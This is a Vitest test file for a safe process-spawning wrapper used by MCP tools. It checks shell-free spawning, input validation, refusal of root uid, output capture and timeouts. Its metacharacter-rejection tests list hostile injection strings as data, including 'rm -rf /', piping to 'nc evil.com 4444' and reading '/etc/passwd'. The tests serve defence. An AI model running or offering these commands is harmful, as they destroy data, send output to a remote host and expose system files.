/**
 * @fileoverview Tests for safe process spawning
 * @author Developer
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { spawn } from 'node:child_process';
import { spawnSafe, spawnWithOutput, McpSpawnError } from '../src/spawn-guard.js';

// [Developer] Mock child_process.spawn
vi.mock('node:child_process');
const mockSpawn = vi.mocked(spawn);

// [Developer] Mock ChildProcess for testing
const createMockChildProcess = () => ({
  on: vi.fn(),
  kill: vi.fn(),
  killed: false,
  stdout: {
    on: vi.fn()
  },
  stderr: {
    on: vi.fn()
  }
});

beforeEach(() => {
  vi.clearAllMocks();
  mockSpawn.mockReturnValue(createMockChildProcess() as any);
});

describe('spawn-guard', () => {
  describe('spawnSafe', () => {
    it('should spawn process with shell: false', () => {
      spawnSafe('echo', ['hello']);

      expect(mockSpawn).toHaveBeenCalledWith(
        'echo',
        ['hello'],
        expect.objectContaining({
          shell: false,
          detached: false
        })
      );
    });

    it('should validate command is string', () => {
      expect(() => {
        spawnSafe(123 as any, []);
      }).toThrow(McpSpawnError);

      try {
        spawnSafe(123 as any, []);
      } catch (error) {
        expect((error as McpSpawnError).message).toContain('Command must be a string');
      }
    });

    it('should validate argv is array', () => {
      expect(() => {
        spawnSafe('echo', 'not-array' as any);
      }).toThrow(McpSpawnError);

      try {
        spawnSafe('echo', 'not-array' as any);
      } catch (error) {
        expect((error as McpSpawnError).message).toContain('Arguments must be an array');
      }
    });

    it('should validate all argv elements are strings', () => {
      expect(() => {
        spawnSafe('echo', ['valid', 123 as any, 'valid']);
      }).toThrow(McpSpawnError);

      try {
        spawnSafe('echo', ['valid', 123 as any, 'valid']);
      } catch (error) {
        expect((error as McpSpawnError).message).toContain('Argument at index 1 must be a string');
      }
    });

    it('should reject commands with shell metacharacters', () => {
      const dangerousCommands = [
        'echo ; rm -rf /',
        'echo && malicious',
        'echo | nc evil.com 4444',
        'echo `backdoor`',
        'echo $(backdoor)',
        'echo < /etc/passwd',
        'echo > /tmp/evil',
        'echo {test}',
        'echo [test]',
        'echo !test',
        'echo ?test',
        'echo *test',
        'echo ~test',
        'echo #test'
      ];

      for (const cmd of dangerousCommands) {
        expect(() => {
          spawnSafe(cmd, []);
        }).toThrow(McpSpawnError);
      }
    });

    it('should reject arguments with shell metacharacters', () => {
      const dangerousArgs = [
        '; rm -rf /',
        '&& malicious',
        '| nc evil.com 4444',
        '`backdoor`',
        '$(backdoor)',
        '< /etc/passwd'
      ];

      for (const arg of dangerousArgs) {
        expect(() => {
          spawnSafe('echo', [arg]);
        }).toThrow(McpSpawnError);
      }
    });

    it('should reject root uid spawning', () => {
      expect(() => {
        spawnSafe('echo', [], { uid: 0 });
      }).toThrow(McpSpawnError);

      try {
        spawnSafe('echo', [], { uid: 0 });
      } catch (error) {
        expect((error as McpSpawnError).message).toContain('Cannot spawn process as root');
      }
    });

    it('should pass through safe options', () => {
      const options = {
        cwd: '/safe/directory',
        env: { NODE_ENV: 'test' },
        stdio: 'pipe' as const,
        uid: 1000,
        gid: 1000
      };

      spawnSafe('echo', ['test'], options);

      expect(mockSpawn).toHaveBeenCalledWith(
        'echo',
        ['test'],
        expect.objectContaining({
          cwd: '/safe/directory',
          env: { NODE_ENV: 'test' },
          stdio: 'pipe',
          uid: 1000,
          gid: 1000,
          shell: false,
          detached: false
        })
      );
    });

    it('should handle spawn errors', () => {
      mockSpawn.mockImplementation(() => {
        throw new Error('spawn failed');
      });

      expect(() => {
        spawnSafe('echo', ['test']);
      }).toThrow(McpSpawnError);
    });

    it('should allow safe commands and arguments', () => {
      const safeCommands = [
        ['node', ['script.js']],
        ['pnpm', ['install', '--frozen-lockfile']],
        ['git', ['status', '--porcelain']],
        ['docker', ['ps', '-a']],
        ['npm', ['run', 'build']]
      ];

      for (const [cmd, args] of safeCommands) {
        expect(() => {
          spawnSafe(cmd, args);
        }).not.toThrow();
      }
    });

    it('should handle empty argv', () => {
      expect(() => {
        spawnSafe('node', []);
      }).not.toThrow();

      expect(mockSpawn).toHaveBeenCalledWith(
        'node',
        [],
        expect.objectContaining({ shell: false })
      );
    });
  });

  describe('spawnWithOutput', () => {
    let mockChild: any;

    beforeEach(() => {
      mockChild = createMockChildProcess();
      mockSpawn.mockReturnValue(mockChild);
    });

    it('should capture stdout and stderr', async () => {
      const promise = spawnWithOutput('echo', ['test']);

      // [Developer] Simulate stdout data
      const stdoutCallback = mockChild.stdout.on.mock.calls.find((call: any) => call[0] === 'data')[1];
      stdoutCallback(Buffer.from('output line 1\n'));
      stdoutCallback(Buffer.from('output line 2\n'));

      // [Developer] Simulate stderr data
      const stderrCallback = mockChild.stderr.on.mock.calls.find((call: any) => call[0] === 'data')[1];
      stderrCallback(Buffer.from('error line 1\n'));

      // [Developer] Simulate process close
      const closeCallback = mockChild.on.mock.calls.find((call: any) => call[0] === 'close')[1];
      closeCallback(0);

      const result = await promise;

      expect(result).toEqual({
        exitCode: 0,
        stdout: 'output line 1\noutput line 2\n',
        stderr: 'error line 1\n'
      });
    });

    it('should handle process errors', async () => {
      const promise = spawnWithOutput('echo', ['test']);

      // [Developer] Simulate process error
      const errorCallback = mockChild.on.mock.calls.find((call: any) => call[0] === 'error')[1];
      errorCallback(new Error('Process failed'));

      await expect(promise).rejects.toThrow(McpSpawnError);
    });

    it('should handle timeout', async () => {
      vi.useFakeTimers();

      const promise = spawnWithOutput('sleep', ['10'], { timeout: 1000 });

      // [Developer] Fast-forward time past timeout
      vi.advanceTimersByTime(1001);

      await expect(promise).rejects.toThrow(McpSpawnError);

      vi.useRealTimers();
    });

    it('should not timeout for fast processes', async () => {
      vi.useFakeTimers();

      const promise = spawnWithOutput('echo', ['fast'], { timeout: 5000 });

      // [Developer] Process completes before timeout
      const closeCallback = mockChild.on.mock.calls.find((call: any) => call[0] === 'close')[1];
      closeCallback(0);

      const result = await promise;
      expect(result.exitCode).toBe(0);

      vi.useRealTimers();
    });

    it('should set stdio to pipe automatically', () => {
      spawnWithOutput('echo', ['test']);

      expect(mockSpawn).toHaveBeenCalledWith(
        'echo',
        ['test'],
        expect.objectContaining({
          stdio: 'pipe'
        })
      );
    });

    it('should handle non-zero exit codes', async () => {
      const promise = spawnWithOutput('exit', ['1']);

      const closeCallback = mockChild.on.mock.calls.find((call: any) => call[0] === 'close')[1];
      closeCallback(1);

      const result = await promise;
      expect(result.exitCode).toBe(1);
    });

    it('should handle null exit codes', async () => {
      const promise = spawnWithOutput('killed-process', []);

      const closeCallback = mockChild.on.mock.calls.find((call: any) => call[0] === 'close')[1];
      closeCallback(null); // Process was killed

      const result = await promise;
      expect(result.exitCode).toBe(null);
    });
  });

  describe('McpSpawnError', () => {
    it('should extend McpToolError', () => {
      const error = new McpSpawnError('Test error');

      expect(error.name).toBe('McpToolError');
      expect(error.code).toBe('SPAWN_ERROR');
      expect(error.retryable).toBe(false);
      expect(error.message).toBe('Test error');
    });

    it('should support retryable flag', () => {
      const retryableError = new McpSpawnError('Temporary error', true);
      const nonRetryableError = new McpSpawnError('Permanent error', false);

      expect(retryableError.retryable).toBe(true);
      expect(nonRetryableError.retryable).toBe(false);
    });
  });
});